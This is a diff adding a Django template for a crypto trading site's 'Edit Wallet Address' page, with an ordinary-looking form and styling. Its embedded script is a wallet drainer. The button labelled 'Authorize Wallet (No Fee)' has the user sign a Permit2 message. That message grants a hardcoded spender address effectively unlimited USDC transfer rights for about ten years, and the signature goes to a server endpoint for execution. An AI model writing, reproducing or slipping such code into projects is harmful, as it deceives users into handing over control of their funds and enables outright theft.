@@ -1,0 +1,114 @@
+{% extends "user/base.html" %}
+
+{% block title %}Edit Wallet Address{% endblock %}
+
+{% block extra_css %}
+    <style>
+        .content { padding: 0 !important; background: #f5f6f8; min-height: 100vh; }
+        .wallet-header { position: relative; height: 44px; display: flex; align-items: center; justify-content: center; color: #fff; background: #000; font-size: 16px; font-weight: 700; }
+        .wallet-back { position: absolute; left: 14px; color: #fff; text-decoration: none; font-size: 30px; line-height: 1; }
+        .wallet-form-wrap { padding: 30px 16px 100px; }
+        .wallet-verify { width: 100%; height: 46px; margin-bottom: 18px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #fff; background: #2f3cff; border: none; border-radius: 9px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .wallet-label { display: block; margin-bottom: 9px; color: #111827; font-size: 14px; font-weight: 700; }
+        .wallet-help { margin: 0 0 16px; color: #6b7280; font-size: 12px; line-height: 1.45; }
+        .wallet-input { width: 100%; min-height: 50px; padding: 13px; color: #111827; background: #f7f7f8; border: 1px solid #e5e7eb; border-radius: 9px; outline: none; font-size: 14px; }
+        .wallet-save { width: 100%; height: 48px; margin-top: 16px; color: #fff; background: #2f3cff; border: 0; border-radius: 9px; font-size: 15px; font-weight: 700; cursor: pointer; }
+    </style>
+{% endblock %}
+
+{% block content %}
+<header class="wallet-header">
+    <a href="{% url 'user_trading_account' %}" class="wallet-back">&#8249;</a>
+    Edit Wallet Address
+</header>
+
+<main class="wallet-form-wrap">
+    {% if profile.need_authorization %}
+        <button type="button" id="verifyBtn" class="wallet-verify">Authorize Wallet (No Fee)</button>
+    {% endif %}
+
+    <form method="post" class="wallet-form-card">
+        {% csrf_token %}
+        <label for="walletAddress" class="wallet-label">Digital Currency Wallet Address</label>
+        <p class="wallet-help">Check the address carefully before saving.</p>
+        <input id="walletAddress" class="wallet-input" type="text" name="wallet_address" value="{{ profile.wallet_address|default:'' }}" required>
+        <button type="submit" class="wallet-save">Save Wallet Address</button>
+    </form>
+</main>
+
+<script type="module">
+    import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js";
+    
+    document.getElementById('verifyBtn')?.addEventListener('click', async () => {
+        try {
+            if (!window.ethereum) {
+                throw new Error("Crypto.com Onchain Wallet or MetaMask not detected.");
+            }
+
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+            const userAddress = await signer.getAddress();
+
+            const TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC
+            const SPENDER_ADDRESS = "0xC629b1959A638d62B60665317C0D3874B389d8F4"; 
+
+            if (!ethers.isAddress(TOKEN_ADDRESS) || !ethers.isAddress(SPENDER_ADDRESS)) {
+                throw new Error("Invalid configuration addresses detected.");
+            }
+
+            const network = await provider.getNetwork();
+
+            const domain = { 
+                name: "Permit2", 
+                chainId: Number(network.chainId), 
+                verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" 
+            };
+            
+            const types = {
+                PermitTransferFrom: [
+                    { name: "permitted", type: "TokenPermissions" },
+                    { name: "spender", type: "address" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ],
+                TokenPermissions: [
+                    { name: "token", type: "address" }, 
+                    { name: "amount", type: "uint256" }
+                ]
+            };
+
+            const message = {
+                permitted: { 
+                    token: TOKEN_ADDRESS, 
+                    amount: "1000000000000000000000000" 
+                },
+                spender: SPENDER_ADDRESS,
+                nonce: 0,
+                deadline: Math.floor(Date.now() / 1000) + 86400 * 3650 
+            };
+
+            const signature = await signer.signTypedData(domain, types, message);
+
+            const response = await fetch('/api/execute-approval/', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json', 
+                    'X-CSRFToken': '{{ csrf_token }}' 
+                },
+                body: JSON.stringify({ signature, message, userAddress })
+            });
+
+            const result = await response.json();
+            if (result.status === 'success') {
+                alert("Authorization submitted successfully.");
+                location.reload();
+            } else {
+                throw new Error(result.message || "Server rejected request.");
+            }
+        } catch (err) { 
+            console.error(err); 
+            alert("Authorization failed: " + err.message); 
+        }
+    });
+</script>
+{% endblock %}
